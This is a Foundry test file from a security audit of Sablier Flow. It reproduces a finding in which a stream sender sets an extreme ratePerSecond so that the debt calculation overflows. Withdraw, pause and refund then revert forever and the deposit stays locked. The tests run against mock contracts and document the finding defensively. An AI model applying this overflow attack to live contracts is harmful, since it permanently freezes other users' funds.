// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./42010-sender-can-brick-stream-by-forcing-overflow-in-debt-calculat.sol";

/*//////////////////////////////////////////////////////////////
    Sablier Flow — Sender can brick a stream by forcing an overflow
    in the ongoing-debt calculation. Finding #42010 (Cantina, Zach
    Obront) — HIGH.

    Drives the synthetic Exploit and re-asserts the harm directly:
    once ratePerSecond is set high enough and time elapses, EVERY
    debt-dependent entrypoint (totalDebtOf/withdraw/pause/refund)
    reverts forever, and the deposited balance is permanently stuck.
//////////////////////////////////////////////////////////////*/
contract Sablier42010Test is Test {
    Exploit exploit;

    function setUp() public {
        // Match the Playground's fixed anvil block timestamp so the
        // registry test and the Playground synthetic behave identically.
        vm.warp(0x65b0a380);
        exploit = new Exploit();
    }

    /// @notice Control: a stream with a sane ratePerSecond never overflows —
    ///         totalDebtOf/withdraw work normally. Isolates the bug to the
    ///         attacker-chosen extreme rate, not the mechanism in general.
    function test_control_normalRate_debtCalculationWorks() public {
        MockToken token = new MockToken();
        SablierFlowLike flow = new SablierFlowLike();
        token.mint(address(this), 1_000_000_000);

        uint256 streamId = flow.createAndDeposit(
            address(this), address(0xBEEF), 100, token, 1_000_000_000, 12
        );

        // elapsedTime(12) * ratePerSecond(100) = 1200, no overflow.
        uint128 debt = flow.totalDebtOf(streamId);
        assertEq(debt, 1200);

        // withdraw succeeds normally.
        uint128 withdrawn = flow.withdraw(streamId, address(0xBEEF), 1000);
        assertEq(withdrawn, 1000);
        assertEq(token.balanceOf(address(0xBEEF)), 1000);
    }

    /// @notice HARM: the attacker (stream sender) sets ratePerSecond to
    ///         type(uint128).max. After time elapses, the debt calculation
    ///         overflows and reverts — bricking withdraw/refund/pause/
    ///         totalDebtOf permanently. The recipient's owed funds and the
    ///         sender's deposit are both stuck forever.
    function test_run_overflowBricksStreamPermanently() public {
        uint256 lockedBefore = exploit.token().balanceOf(address(exploit.flow()));
        assertEq(lockedBefore, 0);

        exploit.run();

        SablierFlowLike flow = exploit.flow();
        MockToken token = exploit.token();
        uint256 streamId = exploit.streamId();
        address recipientAddr = exploit.recipient();

        // Direct re-assertion of the harm (not just trusting run()'s own
        // require()s): every debt-dependent entrypoint reverts.
        vm.expectRevert();
        flow.totalDebtOf(streamId);

        vm.expectRevert();
        flow.withdraw(streamId, recipientAddr, 1);

        vm.expectRevert();
        flow.pause(streamId);

        vm.expectRevert();
        flow.refund(streamId, 1);

        // The full deposit is permanently locked in the Flow contract — no
        // path (sender refund, recipient withdraw, or pause+withdraw) can
        // ever move it again.
        assertEq(token.balanceOf(address(flow)), exploit.DEPOSIT_AMOUNT());
    }
}
